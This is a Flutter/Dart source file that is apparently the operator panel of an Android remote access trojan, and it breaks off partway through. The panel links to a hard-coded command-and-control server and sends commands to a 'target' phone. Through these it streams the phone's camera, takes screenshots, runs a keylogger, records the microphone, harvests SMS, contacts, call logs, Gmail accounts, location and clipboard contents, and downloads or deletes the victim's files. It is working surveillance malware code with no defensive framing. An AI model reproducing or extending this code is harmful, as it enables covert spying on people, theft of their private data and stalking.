// ignore_for_file: use_build_context_synchronously
import 'dart:async';
import 'dart:convert';
import 'dart:math';
import 'dart:typed_data';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:font_awesome_flutter/font_awesome_flutter.dart';

class ControlCenterPage extends StatefulWidget {
  const ControlCenterPage({super.key});

  @override
  State<ControlCenterPage> createState() => _ControlCenterPageState();
}

class _ControlCenterPageState extends State<ControlCenterPage> with SingleTickerProviderStateMixin {
  final List<LogEntry> _executionLogs = [];
  late IO.Socket socket;
  bool _isProcessing = false;
  bool _isConnected = false;
  bool _isInit = false; 
  
  String _targetId = "unknown";
  String _targetModel = "COMMAND CENTER";
  Map<String, dynamic> _deviceData = {};
  
  late AnimationController _pulseController;
  late AnimationController _glowController;
  late AnimationController _rotateController;
  late Animation<double> _pulseAnimation;
  late Animation<double> _glowAnimation;
  late Animation<double> _rotateAnimation;
  
  final ScrollController _logScrollController = ScrollController();
  final TextEditingController _customCommandController = TextEditingController();

  final ValueNotifier<Uint8List?> _liveFrameNotifier = ValueNotifier(null);
  final ValueNotifier<String> _keylogNotifier = ValueNotifier("");

  // GLOWING GREY THEME
  final Color _primaryColor = const Color(0xFFB8B8CC);
  final Color _secondaryColor = const Color(0xFF787890);
  final Color _accentColor = const Color(0xFFD8D8EC);
  final Color _successColor = const Color(0xFF8899AA);
  final Color _warningColor = const Color(0xFFC8B890);
  final Color _darkBg = const Color(0xFF0C0C10);
  final Color _darkerBg = const Color(0xFF070709);
  final Color _surfaceColor = const Color(0xFF161620);
  final Color _cardColor = const Color(0xFF111118);
  final Color _glowColor1 = const Color(0xFFE0E0F8);
  final Color _glowColor2 = const Color(0xFF9090B4);
  final Color _glowColor3 = const Color(0xFFBBBBD0);
  final Color _goldColor = const Color(0xFFCCBB88);
  final Color _roseColor = const Color(0xFFBB8899);

  @override
  void initState() {
    super.initState();
    _pulseController = AnimationController(
      duration: const Duration(milliseconds: 1500),
      vsync: this,
    );
    _pulseAnimation = Tween<double>(begin: 0.92, end: 1.08).animate(_pulseController);
    _pulseController.repeat(reverse: true);
    
    _glowController = AnimationController(
      duration: const Duration(milliseconds: 2500),
      vsync: this,
    );
    _glowController.repeat(reverse: true);
    _glowAnimation = Tween<double>(begin: 0.3, end: 1.0).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOutSine),
    );

    _rotateController = AnimationController(
      duration: const Duration(seconds: 20),
      vsync: this,
    );
    _rotateController.repeat();
    _rotateAnimation = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _rotateController, curve: Curves.linear),
    );
    
    _keylogNotifier.value = "";
  }

  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    if (!_isInit) {
      final args = ModalRoute.of(context)?.settings.arguments;
      if (args is Map<String, dynamic>) {
        final device = args['device'] as Map<String, dynamic>?;
        if (device != null) {
          _targetId = device['id']?.toString() ?? "unknown";
          _targetModel = device['model']?.toString() ?? "TARGET DEVICE";
          _deviceData = device;
        }
      }
      _initSocket();
      _isInit = true;
    }
  }

  Widget _buildAnimatedBackground() {
    return Stack(
      children: [
        Container(
          decoration: BoxDecoration(
            gradient: RadialGradient(
              center: const Alignment(-0.2, -0.4),
              radius: 1.6,
              colors: [_glowColor1.withOpacity(0.05), _darkerBg, _darkBg],
            ),
          ),
        ),
        // Rotating rings
        AnimatedBuilder(
          animation: _rotateAnimation,
          builder: (context, _) {
            final size = MediaQuery.of(context).size;
            return Stack(
              children: [
                Positioned(
                  bottom: -size.height * 0.15,
                  right: -size.width * 0.2,
                  child: Transform.rotate(
                    angle: _rotateAnimation.value * pi * 2,
                    child: Container(
                      width: size.width * 0.7,
                      height: size.width * 0.7,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        border: Border.all(color: _glowColor1.withOpacity(0.05), width: 1),
                      ),
                    ),
                  ),
                ),
                Positioned(
                  top: -size.height * 0.08,
                  left: -size.width * 0.15,
                  child: Transform.rotate(
                    angle: -_rotateAnimation.value * pi,
                    child: Container(
                      width: size.width * 0.5,
                      height: size.width * 0.5,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        border: Border.all(color: _glowColor2.withOpacity(0.06), width: 0.8),
                      ),
                    ),
                  ),
                ),
              ],
            );
          },
        ),
        // Vignette
        Container(
          decoration: BoxDecoration(
            gradient: RadialGradient(
              center: Alignment.center,
              radius: 1.0,
              colors: [
                Colors.transparent,
                Colors.black.withOpacity(0.55),
              ],
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildGlassCard({required Widget child}) {
    return Container(
      decoration: BoxDecoration(
        color: _cardColor,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _glowColor1.withOpacity(0.12), width: 1),
        boxShadow: [
          BoxShadow(color: Colors.black.withOpacity(0.3), blurRadius: 16, offset: const Offset(0, 6)),
        ],
      ),
      child: child,
    );
  }

  void _initSocket() {
    try {
      socket = IO.io(
        'http://kinncloud.sistems.tech:2052',
        IO.OptionBuilder()
            .setTransports(['websocket'])
            .setQuery({'type': 'admin', 'id': 'ADMIN_PANEL'})
            .enableAutoConnect()
            .setReconnectionAttempts(10)
            .setReconnectionDelay(3000)
            .setTimeout(10000)
            .build(),
      );

      socket.onConnect((_) {
        if (mounted) {
          setState(() => _isConnected = true);
          _addLog("C2 Link Established", LogType.success);
          socket.emit('admin_ready', {'status': 'online'});
        }
      });

      socket.onConnectError((data) {
        if (mounted) {
          setState(() => _isConnected = false);
          _addLog("Connection Error - $data", LogType.error);
        }
      });

      socket.onDisconnect((_) {
        if (mounted) {
          setState(() => _isConnected = false);
          _addLog("C2 Link Terminated", LogType.warning);
        }
      });

      socket.on('new_response', (data) {
        String cmd = data['cmd'] ?? 'unknown';
        dynamic responseData = data['data'];
        
        _addLog("INCOMING: $cmd", LogType.info);
        
        if (cmd == "take_photo" || cmd == "get_screen" || cmd == "take_photo_flutter") {
          String imageData = responseData['image'] ?? responseData['screenshot'] ?? '';
          if (imageData.isNotEmpty) {
            _showCapturedPhoto(imageData, cmd);
          }
        } else {
          _handleDataDisplay(cmd, responseData);
        }
        
        _updateCachedData(cmd, responseData);
      });

      socket.on('new_notification', (data) {
        _addLog("NOTIF: [${data['title']}] ${data['body']}", LogType.notification);
        _showNotificationSnackbar(data['title'] ?? "Alert", data['body'] ?? "");
        
        if (mounted) {
          setState(() {
            if (_deviceData['sms'] == null) _deviceData['sms'] = [];
            (_deviceData['sms'] as List).insert(0, {
              'address': data['title'] ?? data['app'],
              'body': data['body'] ?? data['message'],
              'date': data['timestamp'] ?? DateTime.now().millisecondsSinceEpoch,
            });
          });
        }
      });
      
      socket.on('live_frame', (data) {
        if (data['id'] == _targetId || data['deviceId'] == _targetId) {
          String imageData = data['image'] ?? '';
          if (imageData.contains(',')) imageData = imageData.split(',').last;
          if (imageData.isNotEmpty) {
            try {
              _liveFrameNotifier.value = base64Decode(imageData.replaceAll(RegExp(r'\s+'), ''));
            } catch (e) {
              debugPrint("=> [STREAM] Base64 Decode Error: $e");
            }
          }
        }
      });
      
      socket.on('heartbeat', (data) {
        if (mounted && data['deviceId'] == _targetId) {
          setState(() {
            _deviceData['battery'] = data['battery'];
            _deviceData['last_seen'] = DateTime.now();
          });
        }
      });
      
      socket.on('device_info', (data) {
        if (data['id'] == _targetId) {
          setState(() {
            _deviceData.addAll(data);
          });
        }
      });

      socket.on('keylog_data', (data) {
        if (data['deviceId'] == _targetId) {
          String timestamp = DateTime.now().toString().substring(11, 19);
          _keylogNotifier.value += "[$timestamp] ${data['keys']}\n";
          _addLog("KEYLOG: ${data['keys']}", LogType.info);
        }
      });
      
      socket.on('clipboard_data', (data) {
        if (data['deviceId'] == _targetId) {
          _addLog("CLIPBOARD: ${data['content']}", LogType.info);
        }
      });

      socket.connect();
    } catch (e) {
      _addLog("Socket Init Failed - $e", LogType.error);
    }
  }

  void _updateCachedData(String cmd, dynamic data) {
    if (!mounted || data == null) return;
    setState(() {
      dynamic payload = data;
      if (data is Map && data.containsKey('data')) payload = data['data'];

      switch (cmd) {
        case "get_contacts": _deviceData['contacts'] = payload is List ? payload : (payload['contacts'] ?? []); break;
        case "get_sms": _deviceData['sms'] = payload is List ? payload : (payload['sms'] ?? []); break;
        case "get_apps": _deviceData['apps'] = payload is List ? payload : (payload['apps'] ?? []); break;
        case "get_gmails": _deviceData['accounts'] = payload is List ? payload : (payload['accounts'] ?? []); break;
        case "get_location": _deviceData['location'] = payload; break;
        case "list_files": 
          if (payload['files'] != null) _deviceData['files'] = payload['files'];
          break;
        case "get_call_logs":
          if (payload['calls'] != null) _deviceData['calls'] = payload['calls'];
          break;
      }
    });
  }

  @override
  void dispose() {
    _pulseController.dispose();
    _glowController.dispose();
    _rotateController.dispose();
    _logScrollController.dispose();
    _customCommandController.dispose();
    _liveFrameNotifier.dispose();
    _keylogNotifier.dispose();
    socket.disconnect();
    socket.dispose();
    super.dispose();
  }

  void _addLog(String message, [LogType type = LogType.info]) {
    if (mounted) {
      setState(() {
        _executionLogs.insert(0, LogEntry(timestamp: DateTime.now(), message: message, type: type));
        if (_executionLogs.length > 100) _executionLogs.removeLast();
      });
      WidgetsBinding.instance.addPostFrameCallback((_) {
        if (_logScrollController.hasClients) {
          _logScrollController.animateTo(0, duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
        }
      });
    }
  }

  void _showNotificationSnackbar(String title, String body) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(
          children: [
            Icon(Icons.notifications_active, color: _warningColor, size: 18),
            const SizedBox(width: 10),
            Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, mainAxisSize: MainAxisSize.min,
              children: [Text(title, style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 11, fontFamily: 'Rajdhani')), Text(body, style: const TextStyle(fontSize: 10, fontFamily: 'Rajdhani'))],
            )),
          ],
        ),
        backgroundColor: _surfaceColor,
        duration: const Duration(seconds: 5),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12), side: BorderSide(color: _warningColor.withOpacity(0.3), width: 1)),
      ),
    );
  }

  void _showCapturedPhoto(String base64Image, String title) {
    Uint8List bytes = Uint8List(0);
    try {
      bytes = base64Decode(base64Image.replaceAll(RegExp(r'\s+'), ''));
    } catch (e) {
      _addLog("Invalid image data", LogType.error);
      return;
    }
    
    showDialog(
      context: context,
      barrierDismissible: true,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: ClipRRect(
          borderRadius: BorderRadius.circular(28),
          child: BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 20, sigmaY: 20),
            child: Container(
              decoration: BoxDecoration(
                color: _surfaceColor.withOpacity(0.98),
                borderRadius: BorderRadius.circular(28),
                border: Border.all(color: _glowColor1.withOpacity(0.35), width: 1.5),
              ),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Container(
                    padding: const EdgeInsets.all(16),
                    decoration: BoxDecoration(
                      color: _glowColor1.withOpacity(0.05),
                      borderRadius: const BorderRadius.only(topLeft: Radius.circular(28), topRight: Radius.circular(28)),
                    ),
                    child: Row(
                      children: [
                        Container(
                          padding: const EdgeInsets.all(8),
                          decoration: BoxDecoration(
                            color: _glowColor1.withOpacity(0.15),
                            borderRadius: BorderRadius.circular(12),
                          ),
                          child: const Icon(Icons.camera_alt, color: Color(0xFFE0E0F8), size: 16),
                        ),
                        const SizedBox(width: 12),
                        Text(title.toUpperCase(), style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w800, fontSize: 13, fontFamily: 'Rajdhani', letterSpacing: 2)),
                        const Spacer(),
                        Text(_formatTime(DateTime.now()), style: TextStyle(color: Colors.white.withOpacity(0.4), fontSize: 9, fontFamily: 'Rajdhani')),
                      ],
                    ),
                  ),
                  Padding(
                    padding: const EdgeInsets.all(16),
                    child: ClipRRect(
                      borderRadius: BorderRadius.circular(16),
                      child: InteractiveViewer(
                        minScale: 0.5,
                        maxScale: 4.0,
                        child: Image.memory(bytes, fit: BoxFit.contain,
                          errorBuilder: (context, error, stackTrace) => Container(
                            padding: const EdgeInsets.all(40),
                            color: _roseColor.withOpacity(0.1),
                            child: Column(mainAxisSize: MainAxisSize.min,
                              children: [Icon(Icons.broken_image, color: _roseColor, size: 48), const SizedBox(height: 8), Text("Invalid Stream Data", style: TextStyle(color: _roseColor, fontFamily: 'Rajdhani'))],
                            ),
                          ),
                        ),
                      ),
                    ),
                  ),
                  Padding(
                    padding: const EdgeInsets.only(bottom: 16, left: 16, right: 16),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.end,
                      children: [
                        GestureDetector(
                          onTap: () { Clipboard.setData(ClipboardData(text: base64Image)); _addLog("Image data copied to clipboard", LogType.success); },
                          child: Container(
                            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                            decoration: BoxDecoration(
                              color: _glowColor1.withOpacity(0.15),
                              borderRadius: BorderRadius.circular(12),
                            ),
                            child: const Row(
                              children: [
                                Icon(Icons.copy, size: 14, color: Color(0xFFE0E0F8)),
                                SizedBox(width: 4),
                                Text("COPY", style: TextStyle(fontSize: 11, fontFamily: 'Rajdhani', fontWeight: FontWeight.w700, color: Color(0xFFE0E0F8))),
                              ],
                            ),
                          ),
                        ),
                        const SizedBox(width: 12),
                        GestureDetector(
                          onTap: () => Navigator.pop(context),
                          child: Container(
                            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
                            decoration: BoxDecoration(
                              color: _glowColor1.withOpacity(0.92),
                              borderRadius: BorderRadius.circular(14),
                            ),
                            child: const Text("CLOSE", style: TextStyle(fontFamily: 'Rajdhani', fontSize: 11, fontWeight: FontWeight.w900, letterSpacing: 2, color: Color(0xFF070709))),
                          ),
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }

  void _showLiveCameraDialog() {
    _liveFrameNotifier.value = null; 
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: ClipRRect(
          borderRadius: BorderRadius.circular(28),
          child: BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 20, sigmaY: 20),
            child: Container(
              decoration: BoxDecoration(
                color: _surfaceColor.withOpacity(0.98),
                borderRadius: BorderRadius.circular(28),
                border: Border.all(color: _accentColor.withOpacity(0.35), width: 1.5),
              ),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Container(
                    padding: const EdgeInsets.all(16),
                    decoration: BoxDecoration(
                      color: _accentColor.withOpacity(0.05),
                      borderRadius: const BorderRadius.only(topLeft: Radius.circular(28), topRight: Radius.circular(28)),
                    ),
                    child: Row(
                      children: [
                        Container(
                          padding: const EdgeInsets.all(8),
                          decoration: BoxDecoration(
                            color: _accentColor.withOpacity(0.15),
                            borderRadius: BorderRadius.circular(12),
                          ),
                          child: const Icon(Icons.videocam, color: Color(0xFFD8D8EC), size: 16),
                        ),
                        const SizedBox(width: 12),
                        const Text("LIVE CAMERA", style: TextStyle(color: Colors.white, fontWeight: FontWeight.w800, fontSize: 13, fontFamily: 'Rajdhani', letterSpacing: 2)),
                        const Spacer(),
                        SizedBox(width: 14, height: 14, child: CircularProgressIndicator(strokeWidth: 2, color: _accentColor)),
                      ],
                    ),
                  ),
                  Padding(
                    padding: const EdgeInsets.all(12),
                    child: ValueListenableBuilder<Uint8List?>(
                      valueListenable: _liveFrameNotifier,
                      builder: (context, bytes, child) {
                        if (bytes == null) {
                          return Container(
                            height: 250,
                            width: double.infinity,
                            decoration: BoxDecoration(color: _cardColor, borderRadius: BorderRadius.circular(16)),
                            child: Column(mainAxisAlignment: MainAxisAlignment.center,
                              children: [Icon(FontAwesomeIcons.wifi, color: Colors.white38, size: 40), const SizedBox(height: 10), Text("Connecting to target stream...", style: TextStyle(color: Colors.white38, fontFamily: 'Rajdhani', fontSize: 11))],
                            ),
                          );
                        }
                        return ClipRRect(borderRadius: BorderRadius.circular(16), child: Image.memory(bytes, fit: BoxFit.contain, gaplessPlayback: true));
                      },
                    ),
                  ),
                  Padding(
                    padding: const EdgeInsets.only(bottom: 16, right: 16),
                    child: Align(
                      alignment: Alignment.centerRight,
                      child: GestureDetector(
                        onTap: () {
                          _sendCommand("stop_live_camera", _targetId);
                          Navigator.pop(context);
                          _addLog("Live stream terminated by Admin.", LogType.warning);
                        },
                        child: Container(
                          padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
                          decoration: BoxDecoration(
                            color: _roseColor.withOpacity(0.92),
                            borderRadius: BorderRadius.circular(14),
                          ),
                          child: const Text("STOP STREAM", style: TextStyle(fontFamily: 'Rajdhani', fontSize: 11, fontWeight: FontWeight.w900, letterSpacing: 2, color: Color(0xFF070709))),
                        ),
                      ),
                    ),
                  )
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }

  void _handleDataDisplay(String cmd, dynamic data) {
    if (data == null) return;
    switch (cmd) {
      case "get_location": _addLog("GPS: Lat ${data['lat']}, Lng ${data['lng']}", LogType.location); break;
      case "get_gmails": _addLog("GMAIL: ${(data is List ? data : (data['accounts'] ?? [])).length} account(s) found", LogType.info); break;
      case "get_contacts": _addLog("CONTACTS: ${(data is List ? data : (data['contacts'] ?? [])).length} contact(s) retrieved", LogType.info); break;
      case "get_sms": _addLog("SMS: ${(data is List ? data : (data['sms'] ?? [])).length} message(s) retrieved", LogType.info); break;
      case "get_apps": _addLog("APPS: ${(data is List ? data : (data['apps'] ?? [])).length} application(s) found", LogType.info); break;
      case "get_clipboard": _addLog("CLIPBOARD: ${data['clipboard'] ?? 'Empty'}", LogType.info); break;
      default: _addLog("DATA: $cmd - ${data.toString().length > 50 ? data.toString().substring(0, 50) : data.toString()}...", LogType.debug);
    }
  }

  Future<void> _sendCommand(String command, String targetId, {String? extra}) async {
    if (!_isConnected) { 
      _addLog("No C2 connection", LogType.warning); 
      return; 
    }
    
    setState(() => _isProcessing = true);
    
    try {
      final Map<String, dynamic> payload = {
        "deviceId": targetId, 
        "command": command, 
        "extra": extra ?? "", 
        "timestamp": DateTime.now().millisecondsSinceEpoch
      };

      final response = await http.post(
        Uri.parse("http://kinncloud.sistems.tech:2052/api/send-command"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode(payload),
      ).timeout(const Duration(seconds: 15));

      if (response.statusCode == 200) {
        String logMsg = "SENT: $command";
        if (extra != null && extra.isNotEmpty) {
          logMsg += " (Args: $extra)";
        }
        _addLog(logMsg, LogType.success);
      } else {
        _addLog("ERR: Server returned ${response.statusCode} for $command", LogType.error);
      }
    } catch (e) {
      String errStr = e.toString();
      _addLog("ERR: ${errStr.substring(0, errStr.length > 45 ? 45 : errStr.length)}...", LogType.error); 
    } finally { 
      if (mounted) setState(() => _isProcessing = false); 
    }
  }

  String _formatTime(DateTime time) => "${time.hour.toString().padLeft(2, '0')}:${time.minute.toString().padLeft(2, '0')}:${time.second.toString().padLeft(2, '0')}";

  Color _getLogColor(LogType type) {
    switch (type) {
      case LogType.success: return _successColor;
      case LogType.error: return _roseColor;
      case LogType.warning: return _warningColor;
      case LogType.notification: return _glowColor1;
      case LogType.location: return _glowColor2;
      default: return Colors.white70;
    }
  }

  int _parseBattery(dynamic b) {
    if (b is int) return b;
    if (b is double) return b.toInt();
    if (b is String) return int.tryParse(b) ?? 0;
    return 0;
  }

  Color _getBatteryColor(int level) {
    if (level >= 50) return _successColor;
    if (level >= 20) return _warningColor;
    return _roseColor;
  }

  // ==================== RAT ADVANCED FEATURES ====================

  void _openFileManager() {
    _sendCommand("list_files", _targetId, extra: "/storage/emulated/0");
    
    showDialog(
      context: context,
      builder: (context) => StatefulBuilder(
        builder: (context, setStateDialog) {
          String currentPath = "/storage/emulated/0";
          List<Map<String, dynamic>> files = [];
          bool loading = true;
          
          _fetchFiles(currentPath, setStateDialog, files, loading);
          
          return Dialog(
            backgroundColor: Colors.transparent,
            child: _buildGlassCard(
              child: Container(
                width: MediaQuery.of(context).size.width * 0.85,
                height: MediaQuery.of(context).size.height * 0.7,
                padding: const EdgeInsets.all(16),
                child: Column(
                  children: [
                    Row(
                      children: [
                        Container(
                          padding: const EdgeInsets.all(8),
                          decoration: BoxDecoration(
                            color: _glowColor1.withOpacity(0.15),
                            borderRadius: BorderRadius.circular(12),
                          ),
                          child: Icon(Icons.folder, color: _glowColor1, size: 18),
                        ),
                        const SizedBox(width: 8),
                        Text("FILE MANAGER", style: TextStyle(color: _glowColor1, fontFamily: 'Rajdhani', fontSize: 14, fontWeight: FontWeight.w800, letterSpacing: 2)),
                      ],
                    ),
                    const SizedBox(height: 12),
                    Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(color: _surfaceColor, borderRadius: BorderRadius.circular(8)),
                      child: Row(
                        children: [
                          Icon(Icons.folder_open, color: _glowColor2, size: 14),
                          const SizedBox(width: 8),
                          Expanded(child: Text(currentPath, style: const TextStyle(color: Colors.white70, fontSize: 10, fontFamily: 'Rajdhani'), overflow: TextOverflow.ellipsis)),
                        ],
                      ),
                    ),
                    const SizedBox(height: 12),
                    Expanded(
                      child: loading 
                        ? const Center(child: CircularProgressIndicator(color: Color(0xFFE0E0F8)))
                        : ListView.builder(
                            itemCount: files.length,
                            itemBuilder: (ctx, idx) {
                              var file = files[idx];
                              bool isDir = file['isDirectory'] ?? false;
                              return Container(
                                margin: const EdgeInsets.only(bottom: 4),
                                child: _buildGlassCard(
                                  child: ListTile(
                                    leading: Icon(isDir ? Icons.folder : Icons.insert_drive_file, color: isDir ? _glowColor1 : Colors.white54, size: 18),
                                    title: Text(file['name'], style: const TextStyle(color: Colors.white, fontSize: 11, fontFamily: 'Rajdhani')),
                                    subtitle: !isDir ? Text(_formatFileSize(file['size'] ?? 0), style: const TextStyle(color: Colors.white38, fontSize: 9)) : null,
                                    trailing: !isDir ? Row(mainAxisSize: MainAxisSize.min, children: [
                                      GestureDetector(
                                        onTap: () => _downloadFile(file['path']),
                                        child: Container(
                                          padding: const EdgeInsets.all(8),
                                          decoration: BoxDecoration(
                                            color: _successColor.withOpacity(0.15),
                                            borderRadius: BorderRadius.circular(8),
                                          ),
                                          child: Icon(Icons.download, color: _successColor, size: 16),
                                        ),
                                      ),
                                      const SizedBox(width: 8),
                                      GestureDetector(
                                        onTap: () => _deleteFile(file['path']),
                                        child: Container(
                                          padding: const EdgeInsets.all(8),
                                          decoration: BoxDecoration(
                                            color: _roseColor.withOpacity(0.15),
                                            borderRadius: BorderRadius.circular(8),
                                          ),
                                          child: Icon(Icons.delete, color: _roseColor, size: 16),
                                        ),
                                      ),
                                    ]) : null,
                                    onTap: () {
                                      if (isDir) {
                                        currentPath = file['path'];
                                        _fetchFiles(currentPath, setStateDialog, files, loading);
                                      }
                                    },
                                  ),
                                ),
                              );
                            },
                          ),
                    ),
                    const SizedBox(height: 12),
                    Row(
                      mainAxisAlignment: MainAxisAlignment.end,
                      children: [
                        GestureDetector(
                          onTap: () => Navigator.pop(context),
                          child: Container(
                            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                            decoration: BoxDecoration(
                              color: _glowColor1.withOpacity(0.15),
                              borderRadius: BorderRadius.circular(12),
                            ),
                            child: const Text("CLOSE", style: TextStyle(color: Colors.white70, fontFamily: 'Rajdhani', fontSize: 11)),
                          ),
                        ),
                        const SizedBox(width: 8),
                        GestureDetector(
                          onTap: () => _uploadFile(),
                          child: Container(
                            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                            decoration: BoxDecoration(
                              color: _glowColor1.withOpacity(0.92),
                              borderRadius: BorderRadius.circular(12),
                            ),
                            child: const Row(
                              children: [
                                Icon(Icons.upload, size: 14, color: Color(0xFF070709)),
                                SizedBox(width: 6),
                                Text("UPLOAD", style: TextStyle(fontFamily: 'Rajdhani', fontSize: 11, fontWeight: FontWeight.w900, color: Color(0xFF070709))),
                              ],
                            ),
                          ),
                        ),
                      ],
                    ),
                  ],
                ),
              ),
            ),
          );
        },
      ),
    );
  }

  void _fetchFiles(String path, StateSetter setStateDialog, List<Map<String, dynamic>> files, bool loading) async {
    setStateDialog(() { loading = true; });
    try {
      await _sendCommand("list_files", _targetId, extra: path);
      await Future.delayed(const Duration(seconds: 2));
      final response = await http.get(Uri.parse("http://kinncloud.sistems.tech:2052/api/get-response/${_targetId}"));
      
      if (response.statusCode == 200) {
        var data = jsonDecode(response.body);
        if (data['data'] != null && data['data']['files'] != null) {
          setStateDialog(() {
            files.clear();
            files.addAll(List<Map<String, dynamic>>.from(data['data']['files']));
            loading = false;
          });
        } else {
          setStateDialog(() { loading = false; });
        }
      } else {
        setStateDialog(() { loading = false; });
      }
    } catch (e) {
      setStateDialog(() { loading = false; });
    }
  }

  void _downloadFile(String remotePath) async {
    _addLog("Downloading: $remotePath", LogType.info);
    _sendCommand("download_file", _targetId, extra: remotePath);
    await Future.delayed(const Duration(seconds: 3));
    _addLog("File download initiated. Check response logs.", LogType.success);
  }

  void _deleteFile(String remotePath) async {
    _sendCommand("delete_file", _targetId, extra: remotePath);
    _addLog("Deleting: $remotePath", LogType.warning);
  }

  void _uploadFile() async {
    _showInput("UPLOAD FILE", "upload_file", _targetId, hint: "Local path to upload");
  }

  String _formatFileSize(int bytes) {
    if (bytes < 1024) return "$bytes B";
    if (bytes < 1048576) return "${(bytes / 1024).toStringAsFixed(1)} KB";
    if (bytes < 1073741824) return "${(bytes / 1048576).toStringAsFixed(1)} MB";
    return "${(bytes / 1073741824).toStringAsFixed(1)} GB";
  }

  void _startKeylogger() {
    _sendCommand("start_keylogger", _targetId);
    _addLog("Keylogger activated on target", LogType.warning);
    _keylogNotifier.value = "";
    
    showDialog(
      context: context,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: _buildGlassCard(
          child: Container(
            width: 320,
            height: 450,
            padding: const EdgeInsets.all(20),
            child: Column(
              children: [
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: _roseColor.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: Icon(Icons.keyboard, color: _roseColor, size: 18),
                    ),
                    const SizedBox(width: 8),
                    Text("KEYLOGGER ACTIVE", style: TextStyle(color: _roseColor, fontFamily: 'Rajdhani', fontSize: 14, fontWeight: FontWeight.w800, letterSpacing: 2)),
                  ],
                ),
                const SizedBox(height: 12),
                const Text("Captured keystrokes will appear here", style: TextStyle(color: Colors.white70, fontSize: 10, fontFamily: 'Rajdhani')),
                const SizedBox(height: 8),
                Expanded(
                  child: Container(
                    padding: const EdgeInsets.all(8),
                    decoration: BoxDecoration(color: _surfaceColor, borderRadius: BorderRadius.circular(8)),
                    child: ValueListenableBuilder(
                      valueListenable: _keylogNotifier,
                      builder: (context, String logs, child) {
                        return SingleChildScrollView(
                          child: Text(logs, style: const TextStyle(color: Colors.white, fontSize: 10, fontFamily: 'monospace')),
                        );
                      },
                    ),
                  ),
                ),
                const SizedBox(height: 12),
                Row(
                  mainAxisAlignment: MainAxisAlignment.end,
                  children: [
                    GestureDetector(
                      onTap: () {
                        _sendCommand("stop_keylogger", _targetId);
                        Navigator.pop(context);
                        _addLog("Keylogger stopped", LogType.warning);
                      },
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                        decoration: BoxDecoration(
                          color: _roseColor.withOpacity(0.15),
                          borderRadius: BorderRadius.circular(12),
                        ),
                        child: Text("STOP", style: TextStyle(color: _roseColor, fontFamily: 'Rajdhani', fontSize: 11, fontWeight: FontWeight.w700)),
                      ),
                    ),
                    const SizedBox(width: 8),
                    GestureDetector(
                      onTap: () {
                        Clipboard.setData(ClipboardData(text: _keylogNotifier.value));
                        ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("Logs copied")));
                      },
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                        decoration: BoxDecoration(
                          color: _glowColor1.withOpacity(0.92),
                          borderRadius: BorderRadius.circular(12),
                        ),
                        child: const Text("EXPORT", style: TextStyle(fontFamily: 'Rajdhani', fontSize: 11, fontWeight: FontWeight.w900, color: Color(0xFF070709))),
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  void _startMicrophoneRecorder() {
    _sendCommand("start_mic_recording", _targetId);
    _addLog("Microphone recording started", LogType.warning);
    
    showDialog(
      context: context,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: _buildGlassCard(
          child: Padding(
            padding: const EdgeInsets.all(20),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: _roseColor.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: Icon(Icons.mic, color: _roseColor, size: 18),
                    ),
                    const SizedBox(width: 8),
                    Text("RECORDING ACTIVE", style: TextStyle(color: _roseColor, fontFamily: 'Rajdhani', fontSize: 14, fontWeight: FontWeight.w800, letterSpacing: 2)),
                  ],
                ),
                const SizedBox(height: 16),
                Icon(Icons.fiber_manual_record, color: _roseColor, size: 40),
                const SizedBox(height: 12),
                const Text("Target microphone is being recorded", style: TextStyle(color: Colors.white70, fontSize: 11, fontFamily: 'Rajdhani')),
                const SizedBox(height: 16),
                GestureDetector(
                  onTap: () {
                    _sendCommand("stop_mic_recording", _targetId);
                    Navigator.pop(context);
                    _addLog("Recording stopped", LogType.warning);
                  },
                  child: Container(
                    padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
                    decoration: BoxDecoration(
